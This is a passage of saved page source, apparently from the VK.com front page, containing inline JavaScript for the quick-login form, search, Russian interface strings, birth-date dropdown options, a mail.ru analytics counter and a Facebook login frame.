                    qf.appendChild(ce('input', {type: 'hidden', name: i, id: 'quick_login_' + i, value: v}));
                }
            });
        }

        if (qlb) {
            qlb.onclick = function() { if (qf.onsubmit()) qf.submit(); };
        }

        if (browser.opera_mobile) show('quick_expire');

        if (1) {
            hide('support_link_td', 'top_support_link');
        }
        var ts_input = ge('ts_input');
        if (ts_input) {
            placeholderSetup(ts_input, {back: false, reload: true, phColor: '#8fadc8'});
        }
        TopSearch.init();;shortCurrency();
        handlePageParams({"id":0,"pads":1,"loc":"","noleftmenu":1,"wrap_page":1,"width":960,"width_dec":0,"width_dec_footer":0,"body_class":"index_page","counters":"","pvbig":0,"pvdark":1});addEvent(document, 'click', onDocumentClick);
        addLangKeys({"global_apps":"Приложения","global_friends":"Друзья","global_communities":"Сообщества","head_search_results":"Результаты поиска","global_chats":"Диалоги","global_show_all_results":"Показать все результаты","global_news_search_results":"Результаты поиска в новостях"}, true);
        addLangKeys({"index_to_main":"Главная страница","index_choose_sex":"Укажите пол","index_sel_bday":"День"});
        addTemplates({"_":"_"});cur.options = {"bmonths":[[0,"Месяц"],[1,"Января"],[2,"Февраля"],[3,"Марта"],[4,"Апреля"],[5,"Мая"],[6,"Июня"],[7,"Июля"],[8,"Августа"],[9,"Сентября"],[10,"Октября"],[11,"Ноября"],[12,"Декабря"]],"byears":[[0,"Год"],[2002,"2002"],[2001,"2001"],[2000,"2000"],[1999,"1999"],[1998,"1998"],[1997,"1997"],[1996,"1996"],[1995,"1995"],[1994,"1994"],[1993,"1993"],[1992,"1992"],[1991,"1991"],[1990,"1990"],[1989,"1989"],[1988,"1988"],[1987,"1987"],[1986,"1986"],[1985,"1985"],[1984,"1984"],[1983,"1983"],[1982,"1982"],[1981,"1981"],[1980,"1980"],[1979,"1979"],[1978,"1978"],[1977,"1977"],[1976,"1976"],[1975,"1975"],[1974,"1974"],[1973,"1973"],[1972,"1972"],[1971,"1971"],[1970,"1970"],[1969,"1969"],[1968,"1968"],[1967,"1967"],[1966,"1966"],[1965,"1965"],[1964,"1964"],[1963,"1963"],[1962,"1962"],[1961,"1961"],[1960,"1960"],[1959,"1959"],[1958,"1958"],[1957,"1957"],[1956,"1956"],[1955,"1955"],[1954,"1954"],[1953,"1953"],[1952,"1952"],[1951,"1951"],[1950,"1950"],[1949,"1949"],[1948,"1948"],[1947,"1947"],[1946,"1946"],[1945,"1945"],[1944,"1944"],[1943,"1943"],[1942,"1942"],[1941,"1941"],[1940,"1940"],[1939,"1939"],[1938,"1938"],[1937,"1937"],[1936,"1936"],[1935,"1935"],[1934,"1934"],[1933,"1933"],[1932,"1932"],[1931,"1931"],[1930,"1930"],[1929,"1929"],[1928,"1928"],[1927,"1927"],[1926,"1926"],[1925,"1925"],[1924,"1924"],[1923,"1923"],[1922,"1922"],[1921,"1921"],[1920,"1920"],[1919,"1919"],[1918,"1918"],[1917,"1917"],[1916,"1916"],[1915,"1915"],[1914,"1914"],[1913,"1913"],[1912,"1912"],[1911,"1911"],[1910,"1910"],[1909,"1909"],[1908,"1908"],[1907,"1907"],[1906,"1906"],[1905,"1905"],[1904,"1904"],[1903,"1903"],[1902,"1902"],[1901,"1901"]]};
        Index.initNew();cur.fbApp = '128749580520227';
        cur.fbState = 'be988cb4d6b15761d6';
        Index.fbCheck(cur.fbApp, '');
        ;(function (d, w) {
            var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true;
            ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js";
            var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);};
            if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
        })(document, window);
    }
</script>


<div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div></div></div><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div><iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame" tabindex="-1" src="https://staticxx.facebook.com/connect/xd_arbiter/r/P5DLcu0KGJB.js?version=42#channel=f22f11c6f90e02&amp;origin=https%3A%2F%2Fvk.com" style="border: none;"></iframe></div></div></div></body></html>